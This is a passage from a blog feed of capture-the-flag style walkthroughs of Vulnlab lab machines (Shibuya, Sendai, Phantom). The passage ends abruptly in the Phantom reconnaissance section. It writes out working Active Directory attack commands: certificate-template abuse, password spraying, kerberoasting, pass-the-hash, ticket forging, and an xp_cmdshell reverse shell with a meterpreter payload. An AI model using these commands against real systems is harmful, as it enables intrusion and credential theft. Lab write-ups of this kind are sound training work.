id="Privilege-Escalation-via-Certificate-Templates"><a href="#Privilege-Escalation-via-Certificate-Templates" class="headerlink" title="Privilege Escalation via Certificate Templates"></a>Privilege Escalation via Certificate Templates</h2><p>BloodHound revealed that Nigel could RDP to the machine and had certificate enrollment permissions:<br><img src="/images/Shibuya/rdp_access.png" alt="RDP Access"><br><img src="/images/Shibuya/cert_enroll.png" alt="Certificate Enrollment"><br>I set up an SSH tunnel to access LDAP services:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1080 -N sshuser@10.8.5.195</span><br></pre></td></tr></table></figure><p>Used Certipy to analyze the certificate templates:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy find -target 10.10.78.105 -dc-ip 10.10.78.105 -u &#x27;nigel.mills@shibuya.vl&#x27; -p &#x27;&#x27; -debug</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/certipy.png" alt="Certipy Results"><br>Found vulnerabilities in ESC1, ESC2, and ESC3. Decided to exploit ESC1 as it’s the easiest:<br><img src="/images/Shibuya/esc1.png" alt="ESC1 Vulnerability"><br>First attempt at exploiting the certificate template:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy req -dc-ip 10.10.78.105 -target-ip 10.10.78.105 -template ShibuyaWeb -ca shibuya-AWSJPDC0522-CA -u nigel.mills@shibuya.vl -p &#x27;&#x27; -upn administrator@shibuya.vl -key-size 4096 -debug</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/adminkey.png" alt="Admin Key"><br><img src="/images/Shibuya/noadmin.png" alt="No Admin Access"><br>This didn’t work. Looking closer at the template, I noticed that <code>_admin</code> was the owner:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object Control Permissions</span><br><span class="line">   Owner: SHIBUYA.VL\_admin</span><br></pre></td></tr></table></figure><p>Due to certificate-based authentication changes (KB5014754), I needed to include the SID when requesting a certificate:<br><a href="https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16?preview=true">https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16?preview=true</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy req -u nigel.mills@shibuya.vl -p PASS -ca shibuya-AWSJPDC0522-CA -target 10.10.78.105 -target-ip 10.10.78.105 -template ShibuyaWeb -upn &#x27;_admin@shibuya.vl&#x27; -key-size 4096 -sid &#x27;S-1-5-21-87560095-894484815-3652015022-500&#x27; -debug</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy auth -pfx _admin.pfx -dc-ip 10.10.78.105</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/booom.png" alt="Domain Admin Access"><br>Finally, I used Evil-WinRM to access the domain controller as <code>_admin</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q evil-winrm -i 10.10.78.105 -u &#x27;_admin&#x27; -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><p>Success! Domain admin access achieved.</p><p><a href="https://api.vulnlab.com/api/v1/share?id=1e23a5da-28c7-4613-b7ed-b106bc9b90b0">https://api.vulnlab.com/api/v1/share?id=1e23a5da-28c7-4613-b7ed-b106bc9b90b0</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Sendai</title>
      <link href="/2025/04/08/VL-Sendai/"/>
      <url>/2025/04/08/VL-Sendai/</url>
      
        <content type="html"><![CDATA[<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Our first step was to perform a port scan to identify available services:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 65518 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-08 12:50:51Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sendai.vl</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">55350/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55738/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55770/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55774/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>We attempted to enumerate SMB shares using the guest account with a null password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.64.89 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/null_ses.png" alt="Guest SMB Enumeration Results"></p><h2 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><p>Next, we used impacket-lookupsid to enumerate domain users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid sendai.vl/guest@dc.sendai.vl -target 10.10.64.89 -no-pass</span><br></pre></td></tr></table></figure><p>This returned the following users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DC$</span><br><span class="line">sqlsvc</span><br><span class="line">websvc</span><br><span class="line">Dorothy.Jones</span><br><span class="line">Kerry.Robinson</span><br><span class="line">Naomi.Gardner</span><br><span class="line">Anthony.Smith</span><br><span class="line">Susan.Harper</span><br><span class="line">Stephen.Simpson</span><br><span class="line">Marie.Gallagher</span><br><span class="line">Kathleen.Kelly</span><br><span class="line">Norman.Baxter</span><br><span class="line">Jason.Brady</span><br><span class="line">Elliot.Yates</span><br><span class="line">Malcolm.Smith</span><br><span class="line">Lisa.Williams</span><br><span class="line">Ross.Sullivan</span><br><span class="line">Clifford.Davey</span><br><span class="line">Declan.Jenkins</span><br><span class="line">Lawrence.Grant</span><br><span class="line">Leslie.Johnson</span><br><span class="line">Megan.Edwards</span><br><span class="line">Thomas.Powell</span><br><span class="line">mgtsvc$</span><br></pre></td></tr></table></figure><h2 id="Share-Access"><a href="#Share-Access" class="headerlink" title="Share Access"></a>Share Access</h2><p>We accessed the “sendai” share using the guest account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.64.89/sendai -U guest</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/sendai_share.png" alt="Sendai Share Contents"><br>Inside the share, we found an <code>incident.txt</code> file mentioning a penetration test that discovered many weak passwords:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dear valued employees,</span><br><span class="line"></span><br><span class="line">We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.</span><br><span class="line"></span><br><span class="line">To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.</span><br><span class="line"></span><br><span class="line">We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.</span><br><span class="line"></span><br><span class="line">If you need assistance or have any questions regarding the password reset procedure, please don&#x27;t hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.</span><br><span class="line"></span><br><span class="line">Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety. </span><br></pre></td></tr></table></figure><h2 id="Password-Spray-and-Reset"><a href="#Password-Spray-and-Reset" class="headerlink" title="Password Spray and Reset"></a>Password Spray and Reset</h2><p>To identify users with expired passwords, we performed a password spray looking for the <code>STATUS_PASSWORD_MUST_CHANGE</code> flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb sendai.vl -u usernames.txt -p &#x27;&#x27; --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/weak_pass_users.png" alt="Users With Expired Passwords"><br>We found that <code>Elliot.Yates</code> and <code>Thomas.Powell</code> had expired passwords. Using impacket’s changepasswd, we reset their passwords:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">changepasswd.py DOMAIN/Elliot.Yates:&#x27;&#x27;@10.10.72.160</span><br></pre></td></tr></table></figure><p>When prompted for the current password, we pressed enter and set a new password that met the domain’s policy: <code>HelloWorld123@</code><br>We then confirmed access with the new password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb sendai.vl -u Elliot.Yates -p &#x27;HelloWorld123@&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/ellio_shares.png" alt="Elliot&#39;s Accessible Shares"></p><h2 id="Domain-Enumeration-with-BloodHound"><a href="#Domain-Enumeration-with-BloodHound" class="headerlink" title="Domain Enumeration with BloodHound"></a>Domain Enumeration with BloodHound</h2><p>Before exploring the newly accessible shares, we ran BloodHound to get a better understanding of the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap sendai.vl -u Elliot.Yates -p &#x27;HelloWorld123@&#x27; --bloodhound --dns-server 10.10.72.160 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/firts_pth.png" alt="Initial BloodHound Path"><br>From our findings, we identified several potential attack paths:</p><ol><li>Attempt to kerberoast the sql_svc account</li><li>Explore the “config” and “sendai” shares for useful information</li><li>Target the MGTSVC account to gain WinRM access to the DC</li></ol><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>We attempted to kerberoast the sql_svc account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip 10.10.72.160 -request sendai.vl/Elliot.Yates:&#x27;HelloWorld123@&#x27; -dc-host DC.sendai.vl</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/sql_svc_hash.png" alt="SQL Service Account Hash"><br>However, we were unable to crack the hash:<br><img src="/images/Sendai/not_cracked.png" alt="Hash Cracking Attempt Failed"></p><h2 id="Exploring-Shares"><a href="#Exploring-Shares" class="headerlink" title="Exploring Shares"></a>Exploring Shares</h2><p>We accessed the “config” share to look for sensitive information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.72.160/config -U Elliot.Yates </span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/confi_share.png" alt="Config Share Contents"><br>We found a <code>.sqlconfig</code> file containing credentials for the SQL service account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=&lt;PASSWORD&gt;;</span><br></pre></td></tr></table></figure><p>The SQL service account credentials were:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlsvc:SurenessBlob85</span><br></pre></td></tr></table></figure><p>We also noted that the MSSQL service was running on port 1433, which wasn’t visible in our initial scan, suggesting firewall restrictions.</p><h2 id="gMSA-Password-Extraction"><a href="#gMSA-Password-Extraction" class="headerlink" title="gMSA Password Extraction"></a>gMSA Password Extraction</h2><p>First, we added <code>Elliot.Yates</code> to the ADMSVC group:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host DC.sendai.vl -u &#x27;Elliot.Yates&#x27; -p &#x27;HelloWorld123@&#x27; -d &#x27;sendai.vl&#x27; add groupMember ADMSVC Elliot.Yates</span><br></pre></td></tr></table></figure><p>Then we used <code>gMSADumper</code> to retrieve the password for the GMSA account and convert it to an NT hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gMSADumper.py -u &#x27;Elliot.Yates&#x27; -p &#x27;HelloWorld123@&#x27; -d &#x27;sendai.vl&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/gmsadump.png" alt="gMSA Dump Results"><br>With the NT hash, we established a WinRM session:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i sendai.vl -u &#x27;mgtsvc$&#x27; -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><p>(We found the user.txt flag at C:\user.txt)</p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>We discovered that our user could add workstations to the domain.<br><img src="/images/Sendai/add_workstasions.png" alt="Add Workstations Permission"><br>To find additional privilege escalation vectors, we ran <code>PrivescCheck.ps1</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\PrivescCheck.ps1; Invoke-PrivescCheck</span><br></pre></td></tr></table></figure><p>While no cleartext passwords were found, the script discovered a service with credentials in its ImagePath:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Name        : Support</span><br><span class="line">DisplayName :</span><br><span class="line">ImagePath   : C:\WINDOWS\helpdesk.exe -u clifford.davey -p PASS -k netsvcs</span><br><span class="line">User        : LocalSystem</span><br><span class="line">StartMode   : Automatic</span><br></pre></td></tr></table></figure><p>Checking BloodHound again, we found that Clifford.Davey is part of the CA-Operators group:<br><img src="/images/Sendai/ca_operators.png" alt="CA Operators Group Membership"></p><h2 id="ADCS-ESC4-Exploitation"><a href="#ADCS-ESC4-Exploitation" class="headerlink" title="ADCS ESC4 Exploitation"></a>ADCS ESC4 Exploitation</h2><p>We enumerated certificate templates using Clifford’s account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -target 10.10.72.160 -dc-ip 10.10.72.160 -u &#x27;clifford.davey@sendai.vl&#x27; -p &#x27;&#x27; -debug </span><br></pre></td></tr></table></figure><p>We identified a vulnerable certificate template:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : SendaiComputer</span><br><span class="line">    Display Name                        : SendaiComputer</span><br><span class="line">    Certificate Authorities             : sendai-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : False</span><br><span class="line">    Certificate Name Flag               : SubjectAltRequireDns</span><br><span class="line">    Enrollment Flag                     : AutoEnrollment</span><br><span class="line">    Private Key Flag                    : 16842752</span><br><span class="line">    Extended Key Usage                  : Server Authentication</span><br><span class="line">                                          Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 100 years</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 4096</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : SENDAI.VL\Domain Admins</span><br><span class="line">                                          SENDAI.VL\Domain Computers</span><br><span class="line">                                          SENDAI.VL\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : SENDAI.VL\Administrator</span><br><span class="line">        Full Control Principals         : SENDAI.VL\ca-operators</span><br><span class="line">        Write Owner Principals          : SENDAI.VL\Domain Admins</span><br><span class="line">                                          SENDAI.VL\Enterprise Admins</span><br><span class="line">                                          SENDAI.VL\Administrator</span><br><span class="line">                                          SENDAI.VL\ca-operators</span><br><span class="line">        Write Dacl Principals           : SENDAI.VL\Domain Admins</span><br><span class="line">                                          SENDAI.VL\Enterprise Admins</span><br><span class="line">                                          SENDAI.VL\Administrator</span><br><span class="line">                                          SENDAI.VL\ca-operators</span><br><span class="line">        Write Property Principals       : SENDAI.VL\Domain Admins</span><br><span class="line">                                          SENDAI.VL\Enterprise Admins</span><br><span class="line">                                          SENDAI.VL\Administrator</span><br><span class="line">                                          SENDAI.VL\ca-operators</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC4                              : &#x27;SENDAI.VL\\ca-operators&#x27; has dangerous permissions</span><br></pre></td></tr></table></figure><p>We exploited ESC4 by modifying the template to be vulnerable to ESC1. First, we made a backup of the original configuration and made our changes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy template -u clifford.davey@sendai.vl -template SendaiComputer -save-old -p &#x27;RFmoB2WplgE_3p&#x27; -dc-ip 10.10.72.160</span><br></pre></td></tr></table></figure><p>Then, we exploited it as if it were an ESC1 vulnerability:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u clifford.davey@sendai.cl -template SendaiComputer -upn administrator@sendai.vl -ca sendai-DC-CA -dc-ip 10.10.72.160 -target-ip 10.10.72.160 -p &#x27;&#x27; -debug</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx &#x27;administrator.pfx&#x27; -dc-ip 10.10.72.160 -domain sendai.vl</span><br></pre></td></tr></table></figure><p><img src="/images/Sendai/esc01.png" alt="ESC1 Exploitation Success"><br>Finally, we established a WinRM session as Administrator:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i sendai.vl -u administrator -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><h2 id="Alternative-Path-MSSQL-Server-Exploitation"><a href="#Alternative-Path-MSSQL-Server-Exploitation" class="headerlink" title="Alternative Path: MSSQL Server Exploitation"></a>Alternative Path: MSSQL Server Exploitation</h2><p>An alternative path involves accessing the SQL server via a proxy to expose the MSSQL port to our machine. This approach uses the following steps:</p><ol><li>Use ligolo or chisel to expose the MSSQL port</li><li>Create a Kerberos ticket for the Administrator:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ticketer.py -spn MSSQL/dc.sendai.vl -domain-sid S-1-5-21-3085872742-570972823-736764132 -nthash [MSSQL-HASH] -dc-ip dc.sendai.vl Administrator -domain sendai.vl</span><br><span class="line">export KRB5CCNAME=Administrator.ccache</span><br></pre></td></tr></table></figure></li><li>Connect to the SQL server with the ticket:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient dc.sendai.vl -k</span><br><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure></li><li>Set up a command shell to establish remote access:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s ip --p 4444</span><br></pre></td></tr></table></figure></li><li>Execute the shell command:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;powershell -e &lt;hoaxshell&gt;&#x27;</span><br></pre></td></tr></table></figure></li><li>Create and upload a Meterpreter shell:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ip LPORT=443 -f exe -o shell.exe</span><br></pre></td></tr></table></figure></li><li>After getting a Meterpreter session, simply run <code>getsystem</code> to escalate privileges.</li></ol><p><a href="https://api.vulnlab.com/api/v1/share?id=9b6979e9-cbac-4893-8a52-68def2ae889f" title="https://api.vulnlab.com/api/v1/share?id=9b6979e9-cbac-4893-8a52-68def2ae889f">https://api.vulnlab.com/api/v1/share?id=9b6979e9-cbac-4893-8a52-68def2ae889f</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Phantom</title>
      <link href="/2025/04/06/VL-Phantom/"/>
      <url>/2025/04/06/VL-Phantom/</url>
      
        <content type="html"><![CDATA[<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>First, I performed a port scan to identify available services:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: PHANTOM</span><br><span class="line">|   NetBIOS_Domain_Name: PHANTOM</span><br><span class="line">|   NetBIOS_Computer_Name: DC</span><br><span class="line">|   DNS_Domain_Name: phantom.vl</span><br><span class="line">|   DNS_Computer_Name: DC.phantom.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-04-05T12:12:58+00:00</span><br><span class="line">5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49672/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49839/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br></pre></td></tr></table></figure><p>The open ports reveal this is a Windows domain controller (<code>phantom.vl</code>) with typical Active Directory services running, including SMB, Kerberos, LDAP, and WinRM.</p><h2 id="Initial-Access"><a href="#Initial-Access" 